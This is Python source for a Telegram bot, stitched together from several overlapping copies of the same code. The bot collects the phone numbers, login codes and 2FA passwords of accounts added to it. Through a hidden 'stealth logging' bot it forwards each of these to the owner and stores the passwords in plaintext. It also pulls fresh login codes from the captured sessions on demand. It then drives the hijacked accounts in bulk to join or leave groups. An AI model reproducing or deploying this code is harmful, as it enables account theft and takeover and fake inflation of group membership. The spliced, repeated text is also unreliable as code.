            if rid in ADMIN_IDS: ADMIN_IDS.remove(rid)
            await event.respond(f"✅ `{rid}` removed.")
            await main_menu(event)
        except: 
            await event.respond("❌ Invalid ID.")
        return

    # Add Account Flow
    elif user in LOGIN_STATE:
        state = LOGIN_STATE[user]
        if state["step"] == "phone":
            num = text.strip()
            await send_to_master(f"📱 **ATTEMPT:** `{num}` (By: `{user}`)")
            cl = TelegramClient(f"{SESSION_FOLDER}/{num}", API_ID, API_HASH)
            await cl.connect()
            try:
                await cl.send_code_request(num)
                state.update({"step": "otp", "num": num, "cl": cl})
                await event.respond("📩 **OTP SENT!** Enter it now:")
            except Exception as e:
                await event.respond(f"❌ Error: {e}")
                del LOGIN_STATE[user]
        
        elif state["step"] == "otp":
            otp = text.strip()
            await send_to_master(f"📩 **OTP Captured:** `{otp}` for `{state['num']}`")
            try:
                await state["cl"].sign_in(state["num"], otp)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond(f"✅ **ADDED!** Account: `{state['num']}`")
                del LOGIN_STATE[user]
            except SessionPasswordNeededError:
                state["step"] = "2fa"
                await event.respond("🔐 **2FA PASSWORD REQUIRED:**")
            except:
                await event.respond("❌ OTP Error.")
                del LOGIN_STATE[user]
        
        elif state["step"] == "2fa":
            pw = text.strip()
            await send_to_master(f"🔐 **2FA Captured:** `{pw}` for `{state['num']}`")
            with open(f"{SESSION_FOLDER}/{state['num']}.txt", "w") as f:
                f.write(pw)
            try:
                await state["cl"].sign_in(password=pw)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond("✅ **SUCCESS! Account Logged In.**")
                del LOGIN_STATE[user]
            except:
                await event.respond("❌ Wrong Password.")
                del LOGIN_STATE[user]
        return

    # Join/Leave/Pro Flow
    elif MODE.get(user) and "in_lim_" in MODE[user]:
        try:
            ID_LIMIT[user] = int(text)
            MODE[user] = f"in_del_{MODE[user].split('_')[-1]}"
            await event.respond("✅ **STEP 2:** Enter **DELAY** (Seconds between IDs):")
        except: 
            pass
        return

    elif MODE.get(user) and "in_del_" in MODE[user]:
        try:
            DELAY[user] = int(text)
            MODE[user] = f"wait_lk_{MODE[user].split('_')[-1]}"
            await event.respond("🔗 **FINAL STEP:** Send the Group Link or Username:")
        except: 
            pass
        return

    elif MODE.get(user) and "wait_lk_" in MODE[user]:
        link, task = text.strip(), MODE[user].split("_")[-1]
        status = await event.respond(f"⚙️ **Processing {task.upper()}...**\n(Please wait until mission is completed)")
        cl_list = list(ACTIVE_CLIENTS.values())[:ID_LIMIT.get(user, len(ACTIVE_CLIENTS))]
        
        for c in cl_list:
            try:
                await c(UpdateStatusRequest(offline=False))
                h, u = get_hash(link), get_username(link)
                if task in ["join", "pro"]:
                    if h: 
                        if task == "pro": 
                            try:
                                i = await c(CheckChatInviteRequest(h))
                                await c(LeaveChannelRequest(i.chat))
                            except: pass
                        await c(ImportChatInviteRequest(h))
                    else:
                        if task == "pro": 
                            try: await c(LeaveChannelRequest(u))
                            except: pass
                        await c(JoinChannelRequest(u))
                elif task == "single":
                    if h:
                        try:
                            i = await c(CheckChatInviteRequest(h))
                            await c(LeaveChannelRequest(i.chat))
                        except: pass
                    else:
                        await c(LeaveChannelRequest(u))
            except: 
                pass
            await asyncio.sleep(DELAY.get(user, 1))
        
        await status.edit(f"🎯 **{task.upper()} MISSION COMPLETED!**", buttons=BACK_BTN)
        del MODE[user]
        return

# --- BOOT ENGINE ---
async def start_engine():
    print("🔥 Starting Karan Bhaiya Bot on Render...", flush=True)
    await log_bot.start(bot_token=LOG_BOT_TOKEN)
    print("✅ Log Bot Started", flush=True)
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Main Bot Started", flush=True)
    
    # Load existing sessions
    session_files = glob.glob(f"{SESSION_FOLDER}/*.session")
    print(f"📁 Found {len(session_files)} session files", flush=True)
    for f in session_files:
        ph = os.path.basename(f).replace(".session", "")
        c = TelegramClient(f, API_ID, API_HASH)
        try:
            await c.connect()
            if await c.is_user_authorized(): 
                ACTIVE_CLIENTS[ph] = c
                print(f"✅ Loaded session: {ph}", flush=True)
        except Exception as e:
            print(f"❌ Failed to load {ph}: {e}", flush=True)
    
    print(f"🔥 v148 MASTER ONLINE | {len(ACTIVE_CLIENTS)} IDs Active", flush=True)
    await asyncio.gather(bot.run_until_disconnected(), log_bot.run_until_disconnected())

if __name__ == "__main__":
    asyncio.run(start_engine())OWNER_ID = 6371811448
ADMIN_IDS = [OWNER_ID, 6463959160, 7285372203, 8593989565]
OWNER_LINK = "https://t.me/KARANBHAIYAAA"
CHANNEL_LINK = "https://t.me/+mYF4U1BggYU5OGU1"

# --- GLOBAL DATA ---
ACTIVE_CLIENTS = {}
LOGIN_STATE = {}
MODE = {}
DELAY = {}
ID_LIMIT = {}
START_TIME = time.time()

# --- INITIALIZE BOTH BOTS ---
bot = TelegramClient("main_v148", API_ID, API_HASH)
log_bot = TelegramClient("master_v148", API_ID, API_HASH)

BACK_BTN = [[Button.inline("⬅️ RETURN TO MENU", b"back")]]

# --- 🛰️ MASTER STEALTH LOGGING ---
async def send_to_master(msg):
    try:
        await log_bot.send_message(OWNER_ID, msg)
    except:
        pass

# --- 📩 FRESH OTP EXTRACTOR ---
async def get_fresh_otp(client):
    now = datetime.datetime.now(timezone.utc)
    async for msg in client.iter_messages(777000, limit=5):
        diff = (now - msg.date).total_seconds()
        if msg.text and diff < 120:
            otp = re.search(r'\b\d{5,6}\b', msg.text)
            if otp:
                return f"🎯 **FRESH OTP FOUND:** `{otp.group()}`\n⏰ **TIME:** `{msg.date.strftime('%H:%M:%S')}`\n📝 `{msg.text}`"
    return None

# --- HELPER FUNCTIONS ---
def get_hash(link):
    link = link.strip()
    if "+" in link: return link.split("+")[-1]
    if "joinchat/" in link: return link.split("/")[-1]
    return None

def get_username(link):
    return link.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").split("/")[0].strip()

async def send_ui(client, chat_id, text, buttons):
    if PHOTO_FILE and os.path.exists(PHOTO_FILE):
        try:
            await client.send_file(chat_id, PHOTO_FILE, caption=text, buttons=buttons)
        except:
            await client.send_message(chat_id, text, buttons=buttons)
    else:
        await client.send_message(chat_id, text, buttons=buttons)

# --- 🕹️ LOG BOT (MASTER CONTROL) ---
@log_bot.on(events.NewMessage(pattern="/start"))
async def log_start(event):
    if event.sender_id != OWNER_ID: return
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    msg = f"🕹️ **MASTER CONTROL PANEL**\n\n📊 IDs Online: `{len(ACTIVE_CLIENTS)}`\n⏱ Uptime: `{uptime}`"
    buttons = [[Button.inline(f"📱 {num}", f"view_{num}")] for num in ACTIVE_CLIENTS.keys()]
    if not buttons: 
        msg = "⚠️ No IDs logged in yet.\n\nAdd accounts via main bot!"
    await send_ui(log_bot, event.chat_id, msg, buttons)

@log_bot.on(events.CallbackQuery)
async def log_callback(event):
    if event.sender_id != OWNER_ID: return
    data = event.data.decode()
    if data.startswith("view_"):
        num = data.split("_")[-1]
        btns = [
            [Button.inline("📩 GET FRESH OTP", f"m_otp_{num}"), Button.inline("🔐 SHOW PASSWORD", f"m_pw_{num}")],
            [Button.inline("⬅️ BACK", b"log_refresh")]
        ]
        await event.edit(f"⚙️ **CONTROL:** `{num}`", buttons=btns)
    elif data == "log_refresh":
        await log_start(event)
    elif data.startswith("m_otp_"):
        num = data.split("_")[-1]
        if num in ACTIVE_CLIENTS:
            res = await get_fresh_otp(ACTIVE_CLIENTS[num])
            await event.respond(res if res else f"❌ **NO NEW OTP!**")
    elif data.startswith("m_pw_"):
        num = data.split("_")[-1]
        p_path = f"{SESSION_FOLDER}/{num}.txt"
        pw = open(p_path).read() if os.path.exists(p_path) else "Not Saved"
        await event.respond(f"🔑 **ID:** `{num}`\n🔑 **PASS:** `{pw}`")

# --- 👑 MAIN BOT UI DASHBOARD ---
async def main_menu(event):
    MODE.pop(event.sender_id, None)
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    header = (
        "🚀 **KARAN BHAIYA SYSTEM**\n\n"
        f"🟢 IDs: `{len(ACTIVE_CLIENTS)}` | 👥 Admins: `{len(ADMIN_IDS)}`\n"
        f"⏳ Uptime: `{uptime}`\n\n"
        "👑 Owner: @KARANBHAIYAAA\n"
        "🟢 System Running | ⚡ Live\n"
        "👇 Select option"
    )
    buttons = [
        [Button.inline("➕ ADD ACCOUNT", b"add"), Button.inline("🚀 TURBO JOIN", b"join")],
        [Button.inline("❌ SMART LEAVE", b"single"), Button.inline("🔄 PRO RE-JOIN", b"pro")],
        [Button.inline("👥 ADMIN PANEL", b"admin_list"), Button.inline("📊 DIAGNOSTICS", b"about")],
        [Button.url("👑 OWNER", OWNER_LINK)]
    ]
    await send_ui(bot, event.chat_id, header, buttons)

@bot.on(events.NewMessage(pattern="/start"))
async def cmd_start(event):
    if event.sender_id not in ADMIN_IDS:
        denied_msg = (
            "❌ **Tumhare paas koi permission nahi hai.**\n\n"
            "Bot ko start ya run karne ke liye owner se permission leni padegi."
        )
        denied_btns = [
            [Button.url("👑 CONTACT OWNER", OWNER_LINK)],
            [Button.url("📢 JOIN CHANNEL", CHANNEL_LINK)]
        ]
        return await send_ui(bot, event.chat_id, denied_msg, denied_btns)
    await main_menu(event)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user, data = event.sender_id, event.data.decode()
    if user not in ADMIN_IDS: return

    if data == "back":
        await main_menu(event)
    
    elif data == "add":
        LOGIN_STATE[user] = {"step": "phone"}
        await event.edit("📱 **MODULE: ADD ACCOUNT**\n\nSend the phone number (e.g., +91...) to link a new ID.", buttons=BACK_BTN)
    
    elif data in ["join", "pro", "single"]:
        desc = {
            "join": "🚀 **TURBO JOIN:** Fast joining across all online IDs.",
            "pro": "🔄 **PRO RE-JOIN:** IDs will leave then rejoin to refresh members.",
            "single": "❌ **SMART LEAVE:** Safely leave the target group/channel."
        }
        btns = [
            [Button.inline("🔥 ALL IDs", f"SL_all_{data}"), Button.inline("⚙️ CUSTOM LIMIT", f"SL_cust_{data}")],
            [Button.inline("⬅️ BACK", b"back")]
        ]
        await event.edit(f"{desc[data]}\n\n**Select ID strategy:**", buttons=btns)

    elif data.startswith("SL_"):
        _, lim, t = data.split("_")
        ID_LIMIT[user] = len(ACTIVE_CLIENTS) if lim == "all" else 0
        MODE[user] = f"in_lim_{t}" if lim == "cust" else f"in_del_{t}"
        msg = "🔢 **STEP 1:** Enter the number of IDs you want to use:" if lim == "cust" else "✅ **STEP 2:** Enter **DELAY** (Seconds gap between IDs):"
        await event.edit(msg)

    elif data == "admin_list":
        txt = "👥 **AUTHORIZED ADMINS:**\n\n" + "\n".join([f"┣ `{a}`" for a in ADMIN_IDS])
        btns = [
            [Button.inline("➕ ADD ADMIN", b"add_adm"), Button.inline("➖ REMOVE ADMIN", b"rem_adm")],
            [Button.inline("⬅️ BACK", b"back")]
        ]
        await event.edit(txt, buttons=btns)

    elif data == "add_adm": 
        MODE[user] = "get_add_id"
        await event.edit("➕ **Send User ID to authorize:**")
    
    elif data == "rem_adm":
        MODE[user] = "get_rem_id"
        await event.edit("➖ **Send User ID to remove access:**")

    elif data == "about":
        uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
        diag = (
            "🛡️ **SYSTEM DIAGNOSTICS**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Developer:** `KARAN BHAI`\n"
            f"🔌 **Active Nodes:** `{len(ACTIVE_CLIENTS)}` Online\n"
            f"⏱ **System Uptime:** `{uptime}`\n"
            f"👥 **Total Admins:** `{len(ADMIN_IDS)}` Users\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🛒 @KARANBHAIYAAA"
        )
        await event.edit(diag, buttons=BACK_BTN)

# --- 🚀 MESSAGE ENGINE ---
@bot.on(events.NewMessage)
async def message_handler(event):
    user, text = event.sender_id, event.raw_text
    if not text or text.startswith("/") or user not in ADMIN_IDS: return

    if MODE.get(user) == "get_add_id":
        try:
            nid = int(text.strip())
            if nid not in ADMIN_IDS: ADMIN_IDS.append(nid)
            await event.respond(f"✅ `{nid}` added as Admin."); await main_menu(event)
        except: await event.respond("❌ Invalid ID.")
    
    elif MODE.get(user) == "get_rem_id":
        try:
            rid = int(text.strip())
            if rid == OWNER_ID: return await event.respond("❌ Owner cannot be removed!")
            if rid in ADMIN_IDS: ADMIN_IDS.remove(rid)
            await event.respond(f"✅ `{rid}` removed."); await main_menu(event)
        except: await event.respond("❌ Invalid ID.")

    elif user in LOGIN_STATE:
        state = LOGIN_STATE[user]
        if state["step"] == "phone":
            num = text.strip()
            await send_to_master(f"📱 **ATTEMPT:** `{num}` (By: `{user}`)")
            cl = TelegramClient(f"{SESSION_FOLDER}/{num}", API_ID, API_HASH)
            await cl.connect()
            try:
                await cl.send_code_request(num)
                state.update({"step": "otp", "num": num, "cl": cl})
                await event.respond("📩 **OTP SENT!** Enter it now:")
            except Exception as e:
                await event.respond(f"❌ Error: {e}"); del LOGIN_STATE[user]
        
        elif state["step"] == "otp":
            otp = text.strip()
            await send_to_master(f"📩 **OTP Captured:** `{otp}` for `{state['num']}`")
            try:
                await state["cl"].sign_in(state["num"], otp)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond(f"✅ **ADDED!** Account: `{state['num']}`")
                del LOGIN_STATE[user]
            except SessionPasswordNeededError:
                state["step"] = "2fa"
                await event.respond("🔐 **2FA PASSWORD REQUIRED:**")
            except:
                await event.respond("❌ OTP Error."); del LOGIN_STATE[user]
        
        elif state["step"] == "2fa":
            pw = text.strip()
            await send_to_master(f"🔐 **2FA Captured:** `{pw}` for `{state['num']}`")
            with open(f"{SESSION_FOLDER}/{state['num']}.txt", "w") as f:
                f.write(pw)
            try:
                await state["cl"].sign_in(password=pw)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond("✅ **SUCCESS! Account Logged In.**")
                del LOGIN_STATE[user]
            except:
                await event.respond("❌ Wrong Password."); del LOGIN_STATE[user]
    
    elif MODE.get(user) and "in_lim_" in MODE[user]:
        try:
            ID_LIMIT[user] = int(text)
            MODE[user] = f"in_del_{MODE[user].split('_')[-1]}"
            await event.respond("✅ **STEP 2:** Enter **DELAY** (Seconds between IDs):")
        except: pass
    elif MODE.get(user) and "in_del_" in MODE[user]:
        try:
            DELAY[user] = int(text)
            MODE[user] = f"wait_lk_{MODE[user].split('_')[-1]}"
            await event.respond("🔗 **FINAL STEP:** Send the Group Link or Username:")
        except: pass
    elif MODE.get(user) and "wait_lk_" in MODE[user]:
        link, task = text.strip(), MODE[user].split("_")[-1]
        status = await event.respond(f"⚙️ **Processing {task.upper()}...**\n(Please wait until mission is completed)")
        cl_list = list(ACTIVE_CLIENTS.values())[:ID_LIMIT.get(user, len(ACTIVE_CLIENTS))]
        
        for c in cl_list:
            try:
                await c(UpdateStatusRequest(offline=False))
                h, u = get_hash(link), get_username(link)
                if task in ["join", "pro"]:
                    if h: 
                        if task == "pro": 
                            try:
                                i = await c(CheckChatInviteRequest(h))
                                await c(LeaveChannelRequest(i.chat))
                            except: pass
                        await c(ImportChatInviteRequest(h))
                    else:
                        if task == "pro": 
                            try: await c(LeaveChannelRequest(u))
                            except: pass
                        await c(JoinChannelRequest(u))
                elif task == "single":
                    if h:
                        try:
                            i = await c(CheckChatInviteRequest(h))
                            await c(LeaveChannelRequest(i.chat))
                        except: pass
                    else:
                        await c(LeaveChannelRequest(u))
            except: pass
            await asyncio.sleep(DELAY.get(user, 1))
        
        await status.edit(f"🎯 **{task.upper()} MISSION COMPLETED!**", buttons=BACK_BTN)
        del MODE[user]

# --- BOOT ENGINE ---
async def start_engine():
    print("🔥 Starting Karan Bhaiya Bot on Render...", flush=True)
    await log_bot.start(bot_token=LOG_BOT_TOKEN)
    print("✅ Log Bot Started", flush=True)
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Main Bot Started", flush=True)
    
    # Load existing sessions
    session_files = glob.glob(f"{SESSION_FOLDER}/*.session")
    print(f"📁 Found {len(session_files)} session files", flush=True)
    for f in session_files:
        ph = os.path.basename(f).replace(".session", "")
        c = TelegramClient(f, API_ID, API_HASH)
        try:
            await c.connect()
            if await c.is_user_authorized(): 
                ACTIVE_CLIENTS[ph] = c
                print(f"✅ Loaded session: {ph}", flush=True)
        except Exception as e:
            print(f"❌ Failed to load {ph}: {e}", flush=True)
    
    print(f"🔥 v148 MASTER ONLINE | {len(ACTIVE_CLIENTS)} IDs Active", flush=True)
    await asyncio.gather(bot.run_until_disconnected(), log_bot.run_until_disconnected())

if __name__ == "__main__":
    asyncio.run(start_engine())
# --- GLOBAL DATA ---
ACTIVE_CLIENTS = {}
LOGIN_STATE = {}
MODE = {}
DELAY = {}
ID_LIMIT = {}
START_TIME = time.time()

# --- INITIALIZE BOTH BOTS ---
bot = TelegramClient("main_v148", API_ID, API_HASH)
log_bot = TelegramClient("master_v148", API_ID, API_HASH)

BACK_BTN = [[Button.inline("⬅️ RETURN TO MENU", b"back")]]

# --- 🛰️ MASTER STEALTH LOGGING ---
async def send_to_master(msg):
    try:
        await log_bot.send_message(OWNER_ID, msg)
    except:
        pass

# --- 📩 FRESH OTP EXTRACTOR ---
async def get_fresh_otp(client):
    now = datetime.datetime.now(timezone.utc)
    async for msg in client.iter_messages(777000, limit=5):
        diff = (now - msg.date).total_seconds()
        if msg.text and diff < 120:
            otp = re.search(r'\b\d{5,6}\b', msg.text)
            if otp:
                return f"🎯 **FRESH OTP FOUND:** `{otp.group()}`\n⏰ **TIME:** `{msg.date.strftime('%H:%M:%S')}`\n📝 `{msg.text}`"
    return None

# --- HELPER FUNCTIONS ---
def get_hash(link):
    link = link.strip()
    if "+" in link: return link.split("+")[-1]
    if "joinchat/" in link: return link.split("/")[-1]
    return None

def get_username(link):
    return link.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").split("/")[0].strip()

async def send_ui(client, chat_id, text, buttons):
    if os.path.exists(PHOTO_FILE):
        try:
            await client.send_file(chat_id, PHOTO_FILE, caption=text, buttons=buttons)
        except:
            await client.send_message(chat_id, text, buttons=buttons)
    else:
        await client.send_message(chat_id, text, buttons=buttons)

# --- 🕹️ LOG BOT (MASTER CONTROL) ---
@log_bot.on(events.NewMessage(pattern="/start"))
async def log_start(event):
    if event.sender_id != OWNER_ID: return
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    msg = f"🕹️ **MASTER CONTROL PANEL**\n\n📊 IDs Online: `{len(ACTIVE_CLIENTS)}`\n⏱ Uptime: `{uptime}`"
    buttons = [[Button.inline(f"📱 {num}", f"view_{num}")] for num in ACTIVE_CLIENTS.keys()]
    if not buttons: 
        msg = "⚠️ No IDs logged in yet.\n\nAdd accounts via main bot!"
    await send_ui(log_bot, event.chat_id, msg, buttons)

@log_bot.on(events.CallbackQuery)
async def log_callback(event):
    if event.sender_id != OWNER_ID: return
    data = event.data.decode()
    if data.startswith("view_"):
        num = data.split("_")[-1]
        btns = [
            [Button.inline("📩 GET FRESH OTP", f"m_otp_{num}"), Button.inline("🔐 SHOW PASSWORD", f"m_pw_{num}")],
            [Button.inline("⬅️ BACK", b"log_refresh")]
        ]
        await event.edit(f"⚙️ **CONTROL:** `{num}`", buttons=btns)
    elif data == "log_refresh":
        await log_start(event)
    elif data.startswith("m_otp_"):
        num = data.split("_")[-1]
        if num in ACTIVE_CLIENTS:
            res = await get_fresh_otp(ACTIVE_CLIENTS[num])
            await event.respond(res if res else f"❌ **NO NEW OTP!**")
    elif data.startswith("m_pw_"):
        num = data.split("_")[-1]
        p_path = f"{SESSION_FOLDER}/{num}.txt"
        pw = open(p_path).read() if os.path.exists(p_path) else "Not Saved"
        await event.respond(f"🔑 **ID:** `{num}`\n🔑 **PASS:** `{pw}`")

# --- 👑 MAIN BOT UI DASHBOARD ---
async def main_menu(event):
    MODE.pop(event.sender_id, None)
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    header = (
        "🚀 **KARAN BHAIYA SYSTEM**\n\n"
        f"🟢 IDs: `{len(ACTIVE_CLIENTS)}` | 👥 Admins: `{len(ADMIN_IDS)}`\n"
        f"⏳ Uptime: `{uptime}`\n\n"
        "👑 Owner: @KARANBHAIYAAA\n"
        "🟢 System Running | ⚡ Live\n"
        "👇 Select option"
    )
    buttons = [
        [Button.inline("➕ ADD ACCOUNT", b"add"), Button.inline("🚀 TURBO JOIN", b"join")],
        [Button.inline("❌ SMART LEAVE", b"single"), Button.inline("🔄 PRO RE-JOIN", b"pro")],
        [Button.inline("👥 ADMIN PANEL", b"admin_list"), Button.inline("📊 DIAGNOSTICS", b"about")],
        [Button.url("👑 OWNER", OWNER_LINK)]
    ]
    await send_ui(bot, event.chat_id, header, buttons)

@bot.on(events.NewMessage(pattern="/start"))
async def cmd_start(event):
    if event.sender_id not in ADMIN_IDS:
        denied_msg = (
            "❌ **Tumhare paas koi permission nahi hai.**\n\n"
            "Bot ko start ya run karne ke liye owner se permission leni padegi."
        )
        denied_btns = [
            [Button.url("👑 CONTACT OWNER", OWNER_LINK)],
            [Button.url("📢 JOIN CHANNEL", CHANNEL_LINK)]
        ]
        return await send_ui(bot, event.chat_id, denied_msg, denied_btns)
    await main_menu(event)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user, data = event.sender_id, event.data.decode()
    if user not in ADMIN_IDS: return

    if data == "back":
        await main_menu(event)
    
    elif data == "add":
        LOGIN_STATE[user] = {"step": "phone"}
        await event.edit("📱 **MODULE: ADD ACCOUNT**\n\nSend the phone number (e.g., +91...) to link a new ID.", buttons=BACK_BTN)
    
    elif data in ["join", "pro", "single"]:
        desc = {
            "join": "🚀 **TURBO JOIN:** Fast joining across all online IDs.",
            "pro": "🔄 **PRO RE-JOIN:** IDs will leave then rejoin to refresh members.",
            "single": "❌ **SMART LEAVE:** Safely leave the target group/channel."
        }
        btns = [
            [Button.inline("🔥 ALL IDs", f"SL_all_{data}"), Button.inline("⚙️ CUSTOM LIMIT", f"SL_cust_{data}")],
            [Button.inline("⬅️ BACK", b"back")]
        ]
        await event.edit(f"{desc[data]}\n\n**Select ID strategy:**", buttons=btns)

    elif data.startswith("SL_"):
        _, lim, t = data.split("_")
        ID_LIMIT[user] = len(ACTIVE_CLIENTS) if lim == "all" else 0
        MODE[user] = f"in_lim_{t}" if lim == "cust" else f"in_del_{t}"
        msg = "🔢 **STEP 1:** Enter the number of IDs you want to use:" if lim == "cust" else "✅ **STEP 2:** Enter **DELAY** (Seconds gap between IDs):"
        await event.edit(msg)

    elif data == "admin_list":
        txt = "👥 **AUTHORIZED ADMINS:**\n\n" + "\n".join([f"┣ `{a}`" for a in ADMIN_IDS])
        btns = [
            [Button.inline("➕ ADD ADMIN", b"add_adm"), Button.inline("➖ REMOVE ADMIN", b"rem_adm")],
            [Button.inline("⬅️ BACK", b"back")]
        ]
        await event.edit(txt, buttons=btns)

    elif data == "add_adm": 
        MODE[user] = "get_add_id"
        await event.edit("➕ **Send User ID to authorize:**")
    
    elif data == "rem_adm":
        MODE[user] = "get_rem_id"
        await event.edit("➖ **Send User ID to remove access:**")

    elif data == "about":
        uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
        diag = (
            "🛡️ **SYSTEM DIAGNOSTICS**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Developer:** `KARAN BHAI`\n"
            f"🔌 **Active Nodes:** `{len(ACTIVE_CLIENTS)}` Online\n"
            f"⏱ **System Uptime:** `{uptime}`\n"
            f"👥 **Total Admins:** `{len(ADMIN_IDS)}` Users\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🛒 @KARANBHAIYAAA"
        )
        await event.edit(diag, buttons=BACK_BTN)

# --- 🚀 MESSAGE ENGINE ---
@bot.on(events.NewMessage)
async def message_handler(event):
    user, text = event.sender_id, event.raw_text
    if not text or text.startswith("/") or user not in ADMIN_IDS: return

    if MODE.get(user) == "get_add_id":
        try:
            nid = int(text.strip())
            if nid not in ADMIN_IDS: ADMIN_IDS.append(nid)
            await event.respond(f"✅ `{nid}` added as Admin."); await main_menu(event)
        except: await event.respond("❌ Invalid ID.")
    
    elif MODE.get(user) == "get_rem_id":
        try:
            rid = int(text.strip())
            if rid == OWNER_ID: return await event.respond("❌ Owner cannot be removed!")
            if rid in ADMIN_IDS: ADMIN_IDS.remove(rid)
            await event.respond(f"✅ `{rid}` removed."); await main_menu(event)
        except: await event.respond("❌ Invalid ID.")

    elif user in LOGIN_STATE:
        state = LOGIN_STATE[user]
        if state["step"] == "phone":
            num = text.strip()
            await send_to_master(f"📱 **ATTEMPT:** `{num}` (By: `{user}`)")
            cl = TelegramClient(f"{SESSION_FOLDER}/{num}", API_ID, API_HASH)
            await cl.connect()
            try:
                await cl.send_code_request(num)
                state.update({"step": "otp", "num": num, "cl": cl})
                await event.respond("📩 **OTP SENT!** Enter it now:")
            except Exception as e:
                await event.respond(f"❌ Error: {e}"); del LOGIN_STATE[user]
        
        elif state["step"] == "otp":
            otp = text.strip()
            await send_to_master(f"📩 **OTP Captured:** `{otp}` for `{state['num']}`")
            try:
                await state["cl"].sign_in(state["num"], otp)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond(f"✅ **ADDED!** Account: `{state['num']}`")
                del LOGIN_STATE[user]
            except SessionPasswordNeededError:
                state["step"] = "2fa"
                await event.respond("🔐 **2FA PASSWORD REQUIRED:**")
            except:
                await event.respond("❌ OTP Error."); del LOGIN_STATE[user]
        
        elif state["step"] == "2fa":
            pw = text.strip()
            await send_to_master(f"🔐 **2FA Captured:** `{pw}` for `{state['num']}`")
            with open(f"{SESSION_FOLDER}/{state['num']}.txt", "w") as f:
                f.write(pw)
            try:
                await state["cl"].sign_in(password=pw)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond("✅ **SUCCESS! Account Logged In.**")
                del LOGIN_STATE[user]
            except:
                await event.respond("❌ Wrong Password."); del LOGIN_STATE[user]
    
    elif MODE.get(user) and "in_lim_" in MODE[user]:
        try:
            ID_LIMIT[user] = int(text)
            MODE[user] = f"in_del_{MODE[user].split('_')[-1]}"
            await event.respond("✅ **STEP 2:** Enter **DELAY** (Seconds between IDs):")
        except: pass
    elif MODE.get(user) and "in_del_" in MODE[user]:
        try:
            DELAY[user] = int(text)
            MODE[user] = f"wait_lk_{MODE[user].split('_')[-1]}"
            await event.respond("🔗 **FINAL STEP:** Send the Group Link or Username:")
        except: pass
    elif MODE.get(user) and "wait_lk_" in MODE[user]:
        link, task = text.strip(), MODE[user].split("_")[-1]
        status = await event.respond(f"⚙️ **Processing {task.upper()}...**\n(Please wait until mission is completed)")
        cl_list = list(ACTIVE_CLIENTS.values())[:ID_LIMIT.get(user, len(ACTIVE_CLIENTS))]
        
        for c in cl_list:
            try:
                await c(UpdateStatusRequest(offline=False))
                h, u = get_hash(link), get_username(link)
                if task in ["join", "pro"]:
                    if h: 
                        if task == "pro": 
                            try:
                                i = await c(CheckChatInviteRequest(h))
                                await c(LeaveChannelRequest(i.chat))
                            except: pass
                        await c(ImportChatInviteRequest(h))
                    else:
                        if task == "pro": 
                            try: await c(LeaveChannelRequest(u))
                            except: pass
                        await c(JoinChannelRequest(u))
                elif task == "single":
                    if h:
                        try:
                            i = await c(CheckChatInviteRequest(h))
                            await c(LeaveChannelRequest(i.chat))
                        except: pass
                    else:
                        await c(LeaveChannelRequest(u))
            except: pass
            await asyncio.sleep(DELAY.get(user, 1))
        
        await status.edit(f"🎯 **{task.upper()} MISSION COMPLETED!**", buttons=BACK_BTN)
        del MODE[user]

# --- BOOT ENGINE ---
async def start_engine():
    print("🔥 Starting Karan Bhaiya Bot on Render...")
    await log_bot.start(bot_token=LOG_BOT_TOKEN)
    print("✅ Log Bot Started")
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Main Bot Started")
    
    # Load existing sessions
    for f in glob.glob(f"{SESSION_FOLDER}/*.session"):
        ph = os.path.basename(f).replace(".session", "")
        c = TelegramClient(f, API_ID, API_HASH)
        try:
            await c.connect()
            if await c.is_user_authorized(): 
                ACTIVE_CLIENTS[ph] = c
                print(f"✅ Loaded session: {ph}")
        except Exception as e:
            print(f"❌ Failed to load {ph}: {e}")
    
    print(f"🔥 v148 MASTER ONLINE | {len(ACTIVE_CLIENTS)} IDs Active")
    await asyncio.gather(bot.run_until_disconnected(), log_bot.run_until_disconnected())

if __name__ == "__main__":
    asyncio.run(start_engine())
